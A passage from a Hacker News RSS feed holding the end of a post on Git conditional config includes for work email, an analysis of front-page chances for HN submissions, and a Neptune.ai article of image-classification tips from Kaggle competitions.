<p>Each repository also has its own Git configuration located at <code>.git/config</code>. Configs in the local file take precedence over the global configs.</p>

<p>You can set configs in <code>.git/config</code> manually or by passing the <code>--local</code> flag to <code>git config</code>. Thus, if I want to use my work email in a specific repo, I need to set it as follows:</p>

<pre><code>$ git config --local user.email doe@acme.org
</code></pre>

<p>If you want to do this for all work repos, it gets a bit cumbersome. Above all, it’s easy to forget to do this for repos that you’ll clone or create in the future.</p>

<p>Fortunately, Git has a more scalable approach to this problem. You can <strong>conditionally</strong> include further Git config files based on the directory of a Git repo.</p>

<p>Let’s assume that all my work-related repos are inside the folder <code>~/Documents/Acme/repos/</code>.</p>

<p>First, I’ll create a separate Git config file <code>~/.gitconfig-work</code> that contains my work-related overrides:</p>

<pre><code><span>[user]</span>
	<span>email</span> <span>=</span> <span>doe@acme.org</span>
</code></pre>

<p>Then, I include this file from my global Git config file in <code>~/.gitconfig</code>:</p>

<pre><code><span>[includeIf "gitdir:~/Documents/Acme/repos"]</span>
	<span>path</span> <span>=</span> <span>.gitconfig-work</span>
</code></pre>

<p>It’s important to place above snippet <strong>at the end</strong> of your <code>~/.gitconfig</code> file because, according to the <a href="https://git-scm.com/docs/git-config">documentation on git-config</a>:</p>

<blockquote>
  <p>The contents of the included file are inserted immediately, as if they had been found at the location of the include directive.</p>
</blockquote>

<p>If we were to restructure our work directory, e.g. by changing <code>Acme</code> to <code>acme</code> or by moving the repositories somewhere else, such as to <code>~/repos/acme/</code>, the include directive would no longer apply. My newly created commits would now use my globally defined private email rather than my work email. Most likely, I wouldn’t even notice.</p>

<p>To prevent this from happening, we can generalize the path used in the include directive above. First, we can use <code>gitdir/i</code> to perform the matching case-insensitively. Further, there are a few assumptions around the path that can help us. From the <a href="https://git-scm.com/docs/git-config">docs</a>:</p>

<blockquote>
  <ul>
    <li>
      <p>If the pattern does not start with either <code>~/</code>, <code>./</code> or <code>/</code>, <code>**/</code> will be automatically prepended. For example, the pattern <code>foo/bar</code> becomes <code>**/foo/bar</code> and would match <code>/any/path/to/foo/bar</code>.</p>
    </li>
    <li>
      <p>If the pattern ends with <code>/</code>, <code>**</code> will be automatically added. For example, the pattern <code>foo/</code> becomes <code>foo/**</code>. In other words, it matches “foo” and everything inside, recursively.</p>
    </li>
  </ul>
</blockquote>

<p>Equipped with this knowledge, we can generalize the include directive so that it applies to any Git repository that is nested within a folder named after my company—case-insensitively, mind you:</p>

<pre><code><span>[includeIf "gitdir/i:acme/"]</span>
	<span>path</span> <span>=</span> <span>.gitconfig-work</span>
</code></pre>

<p>To verify that this is working, I can look up the resolved config value in a specific repo:</p>

<pre><code>$ cd ~/repos/private/my-project
$ git config user.email
jane@mail.com

$ cd ~/Documents/Acme/repos/website
$ git config user.email
doe@acme.org
</code></pre>

<hr>

<p>I encourage you to check out the <a href="https://git-scm.com/docs/git-config">git-config manual</a> (<code>git help config</code>). You’ll find some interesting things in there. For instance, an include directive can be conditional on the branch you’re currently on.</p>


  
</article>
    </div></div>]]>
            </description>
            <link>https://phili.pe/posts/configuring-git-for-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197762</guid>
            <pubDate>Tue, 24 Nov 2020 12:20:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Lucky with Posting on HN]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197696">thread link</a>) | @jhunter1016
<br/>
November 24, 2020 | https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/ | <a href="https://web.archive.org/web/*/https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>You know the feeling of watching your post quickly drowning in the Newest section of Hacker News, right?
It seems like pure, chaotic luck. Or is it?</p>
<p>I tried to crack the code of successful submissions.</p>
<p>I built a tool that parses Hacker News every two minutes and logs the state into the
database. The program has been working for <strong>14 days</strong> so far.</p>
<p>For the latest two weeks, there were <strong>13846</strong> stories, and only <strong>1403</strong> of them reached the first
page of Hacker News.</p>
<p>It’s <strong>10.1329</strong> percents. It doesn’t sound too bad, does it? It turns out <strong>every tenth story
hits the first page</strong>.</p>
<p><em>All time values are in UTC.</em></p>
<h2 id="stories-and-chances-to-hit-the-first-page">Stories and chances to hit the first page</h2>

<p>It seems like Saturday and Sunday are the least active days when it comes to new stories.
But it means you have the biggest chance to hit the first page during these days.</p>
<h2 id="total-number-of-stories-and-chances-by-hour">Total number of stories and chances by hour</h2>
<p>Let’s take a look what about best hours to publish then.</p>

<ul>
<li>I wouldn’t post at 15:00 - 16:00 since it’s the lowest chance to hit the first page. Too many
submissions during these hours.</li>
<li>11:00 - 12:00 looks like a good spot, everyone is getting awake and your post is already waiting
them on the first page.</li>
</ul>
<h2 id="votes-and-overall-activity">Votes and overall activity</h2>
<p>The watcher continuously checks Hacker News and logs the current position and the score of every
story into the database.</p>
<p>Let’s see what the most active days and hours were.</p>

<ul>
<li>Saturday and Sunday are the least active days.</li>
<li>Monday is the most active day.</li>
</ul>

<ul>
<li>00:00 - 10:00 are the least active hours</li>
<li>14:00 - 21:00 (UTC) are the most active hours on Hacker News.</li>
<li>15:00 - 19:00 (UTC) are the best hours.</li>
</ul>
<h2 id="finally-fun-facts">Finally, fun facts</h2>
<ul>
<li>48 stories hit the first page with literally 1 score point (you get it by default).</li>
<li>4 stories hit the first page with literally 2 score points.</li>
<li>590 stories needed 3 score points to appear on the first page.</li>
<li>318 stories needed 4 points.</li>
<li>143 stories needed 5 points.</li>
</ul>
<p>The longest living posts on the first page:</p>
<ul>
<li>65h13m56s  <a href="https://news.ycombinator.com/item?id=25154128">Flash Animations Live Forever at the Internet Archive </a></li>
<li>63h34m18s  <a href="https://news.ycombinator.com/item?id=25074959">macOS unable to open any non-Apple application</a></li>
<li>49h17m45s  <a href="https://news.ycombinator.com/item?id=25044254">Zoom lied to users about end-to-end encryption for years, FTC says</a></li>
<li>45h29m29s  <a href="https://news.ycombinator.com/item?id=25031491">Japan’s Onryō Spirits Inhabit a Purgatory of Revenge and Cosmic Rage </a></li>
<li>45h26m48s  <a href="https://news.ycombinator.com/item?id=25042002">Large-scale multilingual audio visual dubbing </a></li>
</ul>
<p>I’m going to analyze the statistics even further, it’s just a matter of time.</p>
<p><strong>Follow me on Twitter to get updates: <a href="https://twitter.com/reconquestio">@reconquestio</a></strong></p>
<p>Have an idea or want to contribute? Tweet/Email me.</p>
<h2 id="missing-charts">Missing charts</h2>
<ul>
<li>
<p>The watcher records the position of stories on the page and this data is not illustrated on the charts.</p>
</li>
<li>
<p>There is enough data to come up with a specific interval of time required to get the first upvotes to
get to the first page.</p>
<p>For instance, 3 upvotes in 12 hours will not get you to the first page, but will 3 upvotes
in 5 minutes get you there?</p>
</li>
<li>
<p>How long do posts live on the first page on average?</p>
</li>
</ul>
<h2 id="other-researches">Other researches</h2>
<ul>
<li><a href="https://antontarasenko.com/2015/04/23/best-time-to-post-its-irrelevant/">2015, Best Time to Post? It’s Irrelevant</a></li>
<li><a href="https://www.reddit.com/r/Entrepreneur/comments/5451l4/findings_on_the_optimal_time_to_post_to_hacker/">2016, /r/Enterpreneur: Findings on the optimal time to post to Hacker News</a></li>
<li><a href="https://medium.com/@mi.schaefer/what-is-the-best-time-to-post-to-hacker-news-829fad3eac71">2017, What is the best time to post to Hacker News?</a></li>
<li><a href="https://chanind.github.io/2019/05/07/best-time-to-submit-to-hacker-news.html">2019, The Best Time to Submit to Hacker News</a></li>
</ul>
<p>Thanks to <a href="https://twitter.com/ivmirx">Ivan Mir</a> for reading drafts of this.</p>


<hr>
    <b>Comments</b>
    
    
</article>

        </div></div>]]>
            </description>
            <link>https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197696</guid>
            <pubDate>Tue, 24 Nov 2020 12:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image Classification: Tips and Tricks from 13 Kaggle Competitions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197491">thread link</a>) | @patrycjaneptune
<br/>
November 24, 2020 | https://neptune.ai/blog/image-classification-tips-and-tricks-from-13-kaggle-competitions | <a href="https://web.archive.org/web/*/https://neptune.ai/blog/image-classification-tips-and-tricks-from-13-kaggle-competitions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <article class="page">
	
<p>Success in any field can be distilled into a set of small rules and fundamentals that produce great results when coupled together.&nbsp;</p>



<p>Machine learning and image classification is no different, and engineers can showcase best practices by taking part in competitions like Kaggle.&nbsp;</p>



<p>In this article, I’m going to give you a lot of resources to learn from, focusing on the best Kaggle kernels from 13 Kaggle competitions&nbsp; – with the most prominent competitions being:</p>



<ul><li><a href="https://www.kaggle.com/puneet6060/intel-image-classification" target="_blank" rel="noreferrer noopener nofollow">Intel Image Classification</a></li><li><a href="https://www.kaggle.com/c/recursion-cellular-image-classification" target="_blank" rel="noreferrer noopener nofollow">Recursion Cellular Image Classification</a></li><li><a href="https://www.kaggle.com/c/siim-isic-melanoma-classification" target="_blank" rel="noreferrer noopener nofollow">SIIM-ISIC Melanoma Classification</a></li><li><a href="https://www.kaggle.com/c/aptos2019-blindness-detection/notebooks" target="_blank" rel="noreferrer noopener nofollow">APTOS 2019 Blindness Detection</a>&nbsp;</li><li><a href="https://www.kaggle.com/c/diabetic-retinopathy-detection" target="_blank" rel="noreferrer noopener nofollow">Diabetic Retinopathy Detection</a></li><li><a href="https://www.kaggle.com/c/image-classification-fashion-mnist/notebooks" target="_blank" rel="noreferrer noopener nofollow">ML Project — Image Classification</a></li><li><a href="https://www.kaggle.com/c/cdiscount-image-classification-challenge/notebooks" target="_blank" rel="noreferrer noopener nofollow">Cdiscount’s Image Classification Challenge</a></li><li><a href="https://www.kaggle.com/c/plant-seedlings-classification/notebooks" target="_blank" rel="noreferrer noopener nofollow">Plant seedlings classifications</a></li><li><a href="https://www.kaggle.com/c/aesthetic-visual-analysis/notebooks" target="_blank" rel="noreferrer noopener nofollow">Aesthetic Visual Analysis</a></li></ul>



<p>We’ll go through three main areas of tweaking a Deep learning solution:</p>



<ul><li>Data</li><li>Model&nbsp;</li><li>Loss function&nbsp;</li></ul>



<p>…and there will be a lot of example projects (and references) for you to check out along the way.&nbsp;</p>






<h2>Data</h2>



<h3><strong>Image Pre-processing + EDA&nbsp;</strong></h3>



<div><figure><img loading="lazy" width="241" height="209" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-data-1.png?resize=241%2C209&amp;ssl=1" alt="Kaggle data" data-recalc-dims="1"></figure></div>






<p>Every Machine Learning/Deep Learning Solution starts with raw data. There are 2 essential steps in the data processing pipeline.</p>



<p>The first step is <strong><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline" target="_blank" rel="noreferrer noopener nofollow">Exploratory Data Analysis</a></strong> (EDA). It helps us analyse the entire dataset and summarise its main characteristics, like class distribution, size distribution, and so on. Visual methods are often used to display the results of this analysis.&nbsp;</p>



<p>The second step is <a href="https://towardsdatascience.com/image-pre-processing-c1aec0be3edf" target="_blank" rel="noreferrer noopener nofollow"><strong>Image Pre-Processing</strong></a>, where the aim is to take the raw image and improve image data (also known as image features) by suppressing unwanted distortions, resizing and/or enhancing important features, making the data more suited to the model and improving performance.&nbsp;</p>



<p>You can dig into these Kaggle notebooks to check out a few examples of <strong>Image Pre-Processing</strong> and <strong>EDA</strong> techniques:</p>



<ul><li><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline#Building-a-baseline-model-" target="_blank" rel="noreferrer noopener nofollow">Visualisation</a></li><li><a href="https://www.kaggle.com/rohandeysarkar/ultimate-image-classification-guide-2020" target="_blank" rel="noreferrer noopener nofollow">Dealing with Class imbalance</a></li><li><a href="https://www.kaggle.com/datafan07/analysis-of-melanoma-metadata-and-effnet-ensemble" target="_blank" rel="noreferrer noopener nofollow">Fill missing values (labels, features and, etc.)</a></li><li><a href="https://www.kaggle.com/vincee/intel-image-classification-cnn-keras" target="_blank" rel="noreferrer noopener nofollow">Normalisation </a></li><li><a href="https://www.kaggle.com/ratthachat/aptos-eye-preprocessing-in-diabetic-retinopathy#3.A-Important-Update-on-Color-Version-of-Cropping-&amp;-Ben's-Preprocessing" target="_blank" rel="noreferrer noopener nofollow">Pre-processing</a></li></ul>






<h3><strong>Data Augmentation</strong></h3>



<div><figure><img loading="lazy" width="500" height="281" src="https://i1.wp.com/neptune.ai/wp-content/uploads/Kaggle-data-augmentation.gif?resize=500%2C281&amp;ssl=1" alt="Kaggle data augmentation" data-recalc-dims="1"></figure></div>



<p><a href="https://media1.giphy.com/media/ciwwr8kBcdGSJUkRZ8/giphy.gif" target="_blank" rel="noreferrer noopener nofollow"><em>Credits</em></a></p>



<p><strong>Data augmentation</strong> can expand our dataset by generating more training data from existing training samples. New samples are generated via a number of random transformations that not only yield believable-looking images but also reflect real-life scenarios—more on this later.</p>



<p>This technique is widely used, and not just in cases with too few data samples to train the model. In this case, the model starts to memorize the training set, but it is unable to generalize (performs poorly on never seen data).&nbsp;</p>



<p>Usually, when a model performs great on training data but poorly on validation data, we call this condition <a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow"><strong><em>overfitting</em></strong></a>. To solve this problem, we usually try to get new data, and if new data isn’t available, data augmentation comes to the rescue.</p>



<p><strong>Note</strong>: A general rule of thumb is to always use data augmentation techniques because it helps expose our model to more variations and generalize better. Even if we have a large dataset, although it comes at the cost of slow training speed because augmentations are done on-the-fly (which means during training).&nbsp;</p>



<p>Plus, for each task or dataset, we have to use augmentation techniques that reflect possible real-life scenarios (i.e. if we have a cat/dog detector we can use horizontal flip, crop, brightness and contrast because these augmentations match differences in how photos are taken).</p>



<p>Here are a few Kaggle competition notebooks for you to check out popular data augmentation techniques in practice:</p>



<ul><li><a href="https://www.kaggle.com/datafan07/analysis-of-melanoma-metadata-and-effnet-ensemble" target="_blank" rel="noreferrer noopener nofollow">Horizontal Flip</a></li><li><a href="https://www.kaggle.com/iafoss/pretrained-resnet34-with-rgby-0-460-public-lb" rel="noreferrer noopener nofollow" target="_blank">Random Rotate and Random Dihedral</a></li><li><a href="https://www.kaggle.com/cdeotte/triple-stratified-kfold-with-tfrecords" target="_blank" rel="noreferrer noopener nofollow">Hue, Saturation, Contrast, Brightness, Crop</a></li><li><a href="https://www.kaggle.com/nroman/melanoma-pytorch-starter-efficientnet" rel="noreferrer noopener nofollow" target="_blank">Colour jitter</a></li></ul>






<h2>Model</h2>



<div><figure><img loading="lazy" width="500" height="343" src="https://i0.wp.com/neptune.ai/wp-content/uploads/kaggle-machine-learning.png?resize=500%2C343&amp;ssl=1" alt="kaggle machine learning " srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/kaggle-machine-learning.png?w=500&amp;ssl=1 500w, https://i0.wp.com/neptune.ai/wp-content/uploads/kaggle-machine-learning.png?resize=300%2C206&amp;ssl=1 300w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://www.google.com/search?q=i+can+predict+the+future+meme&amp;tbm=isch&amp;ved=2ahUKEwj-kuj346zsAhXLALcAHYUHCBkQ2-cCegQIABAC&amp;oq=i+can+predict+the+future+meme&amp;gs_lcp=ChJtb2JpbGUtZ3dzLXdpei1pbWcQAzICCAA6BggAEAcQHjoECAAQDVD2SFigUmDHU2gAcAB4AIABuQGIAZ8HkgEDMC43mAEAoAEBwAEB&amp;sclient=mobile-gws-wiz-img&amp;ei=wBqDX_6yN8uB3LUPhY-gyAE&amp;bih=695&amp;biw=1080&amp;prmd=isvn&amp;rlz=1C9BKJA_enIN888IN888&amp;safe=strict&amp;hl=en-US#imgrc=zIkrgmXonyocyM&amp;imgdii=745rZYAZFGURlM" target="_blank" rel="noreferrer noopener nofollow">Credits</a></em></p>



<h3><strong>Develop a baseline (<a href="https://www.kaggle.com/uzairrj/beg-tut-intel-image-classification-93-76-accur" target="_blank" rel="noreferrer noopener nofollow">example project</a>)</strong></h3>



<p>Here we create a basic model using a very simple architecture, without any regularization or dropout layers, and see if we can beat the baseline score of 50% accuracy. Although we can’t always get there, if we can’t beat the baseline after trying multiple reasonable architectures, maybe the input data doesn’t hold the information required for our model to make a prediction.&nbsp;</p>



<p>In the wise and paraphrased words of Jeremy Howard:</p>



<p>“You should be able to quickly test if you are going into a promising direction, in 15 minutes using 50% or less of the dataset, if not you have to rethink everything.”</p>






<h3><strong>Develop a model large enough that it overfits (<a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline#Building-a-baseline-model-" target="_blank" rel="noreferrer noopener nofollow">example project</a>)</strong></h3>



<p>Once our baseline model has enough capacity to beat the baseline score, we can increase the baseline model capacity until it overfits the dataset, then we move to applying regularization. We can increase module capacity by:</p>



<ul><li>Adding more layers</li><li>Using a better architecture&nbsp;</li><li>Better training procedures</li></ul>






<h3><strong>Architecture</strong></h3>



<p>According to literature, the architecture refinements below improve model capacity, but barely change the computational complexity. They’re still pretty interesting if you want to dig into the linked examples:</p>



<ul><li><a href="https://arxiv.org/abs/1812.01187" target="_blank" rel="noreferrer noopener nofollow">Residual Networks</a></li><li><a href="https://arxiv.org/abs/1605.07146" target="_blank" rel="noreferrer noopener nofollow">Wide Residual Networks</a></li><li><a href="https://arxiv.org/abs/1812.01187" target="_blank" rel="noreferrer noopener nofollow">Inception</a></li><li><a href="https://www.kaggle.com/hmendonca/fold1h4r3-arcenetb4-2-256px-rcic-lb-0-9759" target="_blank" rel="noreferrer noopener nofollow">EfficientNet</a></li><li><a href="https://www.kaggle.com/hmendonca/fold1h4r3-arcenetb4-2-256px-rcic-lb-0-9759" target="_blank" rel="noreferrer noopener nofollow">Swish activation</a></li><li><a href="https://www.kaggle.com/kmader/inceptionv3-for-retinopathy-gpu-hr" target="_blank" rel="noreferrer noopener nofollow">Residual Attention Network</a></li></ul>



<p>Most of the time, model capacity and accuracy are positively correlated to each other – as the capacity increases, the accuracy increases too, and vice-versa.</p>






<h3><strong>Training procedures</strong></h3>



<p>Here are some training procedures you can use to tweak your model, with example projects to see how they work:</p>



<ul><li><a href="https://arxiv.org/abs/1710.03740" target="_blank" rel="noreferrer noopener nofollow">Mixed-Precision Training</a></li><li><a href="https://arxiv.org/abs/1812.01187" target="_blank" rel="noreferrer noopener nofollow">Large Batch-Size Training</a></li><li><a href="https://www.kaggle.com/datafan07/analysis-of-melanoma-metadata-and-effnet-ensemble" target="_blank" rel="noreferrer noopener nofollow">Cross-Validation Set</a></li><li><a href="https://towardsdatascience.com/weight-initialization-in-neural-networks-a-journey-from-the-basics-to-kaiming-954fb9b47c79" target="_blank" rel="noreferrer noopener nofollow">Weight Initialization</a></li><li><a href="https://arxiv.org/pdf/1911.04252.pdf" target="_blank" rel="noreferrer noopener nofollow">Self-Supervised Training (Knowledge Distillation)</a></li><li><a href="https://arxiv.org/abs/1812.01187" target="_blank" rel="noreferrer noopener nofollow">Learning Rate Scheduler</a></li><li><a href="https://arxiv.org/abs/1812.01187" target="_blank" rel="noreferrer noopener nofollow">Learning Rate Warmup</a></li><li><a href="https://www.kaggle.com/rohandeysarkar/ultimate-image-classification-guide-2020" target="_blank" rel="noreferrer noopener nofollow">Early Stopping</a></li><li><a href="https://www.kaggle.com/dataraj/fastai-tutorial-for-image-classification" target="_blank" rel="noreferrer noopener nofollow">Differential Learning Rates</a></li><li><a href="https://www.kaggle.com/vincee/intel-image-classification-cnn-keras" target="_blank" rel="noreferrer noopener nofollow">Ensemble</a></li><li><a href="https://www.kaggle.com/dataraj/fastai-tutorial-for-image-classification" target="_blank" rel="noreferrer noopener nofollow">Transfer Learning</a></li><li><a href="https://www.kaggle.com/vincee/intel-image-classification-cnn-keras" rel="noreferrer noopener nofollow" target="_blank">Fine-Tuning</a></li></ul>






<h3><strong>Hyperparameter tuning</strong></h3>



<div><figure><img loading="lazy" width="480" height="345" src="https://i2.wp.com/neptune.ai/wp-content/uploads/Kaggle-Hyperparameter-Tuning.gif?resize=480%2C345&amp;ssl=1" alt="Kaggle Hyperparameter Tuning" data-recalc-dims="1"></figure></div>



<p><em><a href="https://images.app.goo.gl/a5g4VdSBKLZfccXW6" target="_blank" rel="noreferrer noopener nofollow">Credits</a></em></p>



<p>Unlike parameters, <a href="https://www.oreilly.com/library/view/evaluating-machine-learning/9781492048756/ch04.html" target="_blank" rel="noreferrer noopener nofollow">hyperparameters</a> are specified by you when you configure the model (i.e. learning rate, number of epochs, number of hidden units, batch size, etc).&nbsp;</p>



<p>Instead of trying different model configurations manually, you can automate this process by using hyperparameter tuning libraries like <a href="http://scikit-learn.org/stable/modules/generated/sklearn.model_selection.GridSearchCV.html" target="_blank" rel="noreferrer noopener nofollow"><strong>Scikit learn Grid Search</strong></a>, <strong><a href="https://keras-team.github.io/keras-tuner/" target="_blank" rel="noreferrer noopener nofollow">Keras Tuner</a>,</strong> and others that will try all hyperparameter combinations within the range you specify, and it will return the best performing model.</p>



<p>The more hyperparameters you need to tune, the slower the process, so it’s good to select a minimum subset of model hyperparameters to tune.</p>



<p>Not all model hyperparameters are equally important. Some hyperparameters have an outsized effect on the behaviour, and in turn the performance, of a machine learning algorithm. You should carefully pick the ones that impact your model’s performance the most, and tune them for maximum performance.</p>






<h3><strong>Regularization</strong></h3>



<p>This method forces the model to learn a meaningful and generalisable representation of the data by penalising <a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow"><strong><em>memorization/overfitting</em></strong></a> and <a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow"><strong><em>underfitting</em></strong></a>, making the model more robust at dealing with data it has never seen before.&nbsp;</p>



<p>One simple method to solve the problems stated above is to get more training data, because a model trained on more data will naturally generalize better.</p>



<p>Here are some techniques you can try to mitigate <a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow"><strong><em>overfitting</em></strong></a> and <a href="https://machinelearningmastery.com/overfitting-and-underfitting-with-machine-learning-algorithms/" target="_blank" rel="noreferrer noopener nofollow"><strong><em>underfitting</em></strong></a>, with example project links for you to dig into:</p>



<ul><li><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline" target="_blank" rel="noreferrer noopener nofollow">Adding Dropout</a></li><li><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline" target="_blank" rel="noreferrer noopener nofollow">Adding or changing the position of Batch Norm</a></li><li><a href="https://www.kaggle.com/cdeotte/triple-stratified-kfold-with-tfrecords" target="_blank" rel="noreferrer noopener nofollow">Data augmentation</a></li><li><a href="https://arxiv.org/abs/1710.09412" target="_blank" rel="noreferrer noopener nofollow">Mixup</a></li><li><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline" target="_blank" rel="noreferrer noopener nofollow">Weight regularization</a></li><li><a href="https://www.kaggle.com/allunia/protein-atlas-exploration-and-baseline" target="_blank" rel="noreferrer noopener nofollow">Gradient clipping</a></li></ul>






<h2>Loss function</h2>



<div><figure><img loading="lazy" width="400" height="300" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-loss-function.png?resize=400%2C300&amp;ssl=1" alt="Kaggle loss function" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-loss-function.png?w=400&amp;ssl=1 400w, https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-loss-function.png?resize=300%2C225&amp;ssl=1 300w" sizes="(max-width: 400px) 100vw, 400px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://memegenerator.net/img/instances/64802690.jpg" target="_blank" rel="noreferrer noopener nofollow">Credits</a></em></p>



<p>Also known as cost function or objective function, the <a href="https://medium.com/@prince.canuma/how-to-develop-your-ai-intuition-ii-9dedb4a41c1c" target="_blank" rel="noreferrer noopener nofollow"><strong>loss function</strong></a> is used to find the difference between the models output from the target output, and to help the model minimize the distance between them.</p>



<p>Here are some of the most popular loss functions, with project examples where you’ll find tricks to improve your model capacity:</p>



<ul><li><a href="https://arxiv.org/pdf/1906.02629.pdf" target="_blank" rel="noreferrer noopener nofollow">Label smoothing</a>&nbsp;</li><li><a href="https://www.kaggle.com/iafoss/pretrained-resnet34-with-rgby-0-460-public-lb" rel="noreferrer noopener nofollow" target="_blank">Focal loss</a></li><li><a href="https://arxiv.org/pdf/2009.13935.pdf" target="_blank" rel="noreferrer noopener nofollow">SparseMax loss and Weighted cross-entropy</a></li><li><a href="https://gombru.github.io/2018/05/23/cross_entropy_loss/" target="_blank" rel="noreferrer noopener nofollow">BCE loss, BCE with logits loss and Categorical cross-entropy loss</a></li><li><a href="https://arxiv.org/abs/1801.07698" target="_blank" rel="noreferrer noopener nofollow">Additive Angular Margin Loss for Deep Face Recognition</a></li></ul>






<h3><strong>Evaluation + error analysis</strong></h3>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-error-analysis.jpg?resize=504%2C343&amp;ssl=1" alt="Kaggle error analysis" width="504" height="343" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-error-analysis.jpg?w=672&amp;ssl=1 672w, https://i0.wp.com/neptune.ai/wp-content/uploads/Kaggle-error-analysis.jpg?resize=300%2C204&amp;ssl=1 300w" sizes="(max-width: 504px) 100vw, 504px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://www.google.com/search?q=error+analysis+mem&amp;tbm=isch&amp;ved=2ahUKEwirzZvK6KzsAhUEkksFHdVoDXwQ2-cCegQIABAC&amp;oq=error+analysis+mem&amp;gs_lcp=ChJtb2JpbGUtZ3dzLXdpei1pbWcQAzICCAA6BAgAEEM6BQgAEM0COgQIABANOgYIABAIEB46BAgAEBhQ_xRYzClgtCtoBHAAeACAAbUBiAHxCJIBAzAuOJgBAKABAcABAQ&amp;sclient=mobile-gws-wiz-img&amp;ei=nx-DX-uBHISkrtoP1dG14Ac&amp;bih=695&amp;biw=1080&amp;prmd=bivn&amp;rlz=1C9BKJA_enIN888IN888&amp;safe=strict&amp;hl=en-US#imgrc=18Fu76HGpiW_zM" target="_blank" rel="noreferrer noopener nofollow">Credits</a></em></p>



<p>Here, we do an ablation study, and analyse our experiment results. We identify our model’s weaknesses and strengths, and identify areas to improve in the future. You can use the below techniques at this stage, and see how they’re implemented in the linked examples:</p>



<ul><li><a href="https://www.kaggle.com/vincee/intel-image-classification-cnn-keras" target="_blank" rel="noreferrer noopener nofollow">Tracking metrics and Confusion matrix</a></li><li><a href="https://arxiv.org/pdf/1610.02391v1.pdf" target="_blank" rel="noreferrer noopener nofollow">Grad CAM</a></li><li><a href="https://www.kaggle.com/iafoss/pretrained-resnet34-with-rgby-0-460-public-lb" target="_blank" rel="noreferrer noopener nofollow">Test Time Augmentation (TTA)</a></li></ul>



<p>There are many experiment tracking and management tools that take the minimal setup to save all the data for you automatically, which makes the ablation study easier – <a href="https://neptune.ai/" target="_blank" rel="noreferrer noopener nofollow">Neptune.ai</a> does a great job here.</p>






<h2>Closing thoughts</h2>



<p>There are many ways to tweak your models, and new ideas come out all the time. Deep Learning is a fast moving field and there are no silver bullet methods. We have to experiment a lot, and enough trial and error causes breakthroughs. This article already contains a lot of links, but for the most knowledge-hungry readers, I also added a long <strong>reference section</strong> below for you to read more and run some notebooks.</p>



<h3><strong>Further research</strong></h3>



<ul><li><a href="https://www.kaggle.com/blazeka/multi-gpu-tensorflow-convnet-0-65" target="_blank" rel="noreferrer noopener nofollow">Distributed Training</a></li><li><a href="https://www.kaggle.com/sentdex/first-pass-through-data-w-3d-convnet" target="_blank" rel="noreferrer noopener nofollow">3D Image classification</a></li><li><a href="https://github.com/fastai/fastbook/blob/master/01_intro.ipynb" target="_blank" rel="noreferrer noopener nofollow">Converting data from other domains into images</a></li><li><a href="https://arxiv.org/abs/2009.11892" target="_blank" rel="noreferrer noopener nofollow">PK-GCN: Prior Knowledge Assisted Image Classification using Graph Convolution Networks</a></li></ul>



<h3><strong>References</strong></h3>



<p>Papers:</p>



<ul><li><a href="https://arxiv.org/abs/1605.07146" target="_blank" rel="noreferrer noopener nofollow">Wide Residual Networks</a></li><li><a href="https://arxiv.org/abs/1710.09412" target="_blank" rel="noreferrer noopener nofollow">mixup: BEYOND EMPIRICAL RISK MINIMIZATION</a></li><li><a href="https://arxiv.org/abs/1801.07698" target="_blank" rel="noreferrer noopener nofollow">ArcFace: Additive Angular Margin Loss for Deep Face Recognition</a>&nbsp;</li><li><a href="https://arxiv.org/abs/1905.11946" target="_blank" rel="noreferrer noopener nofollow">EfficientNet: Rethinking Model Scaling for Convolutional Neural Networks</a></li><li><a href="https://arxiv.org/abs/1710.05941" target="_blank" rel="noreferrer noopener nofollow">Searching for Activation Functions</a></li><li><a href="https://arxiv.org/abs/1704.06904" target="_blank" rel="noreferrer noopener nofollow">Residual Attention Network for Image Classification</a></li><li><a href="https://arxiv.org/abs/1710.03740" target="_blank" rel="noreferrer noopener nofollow">Mixed Precision Training</a></li><li><a href="https://arxiv.org/pdf/1911.04252.pdf" target="_blank" rel="noreferrer noopener nofollow">Self-training with Noisy Student improves ImageNet classification</a></li><li><a href="https://arxiv.org/abs/1906.02629" target="_blank" rel="noreferrer noopener nofollow">When Does Label Smoothing Help?</a></li><li><a href="https://arxiv.org/abs/1801.07698" target="_blank" rel="noreferrer noopener nofollow">Additive Angular Margin Loss for Deep Face Recognition</a></li><li><a href="https://arxiv.org/pdf/1610.02391v1.pdf" target="_blank" 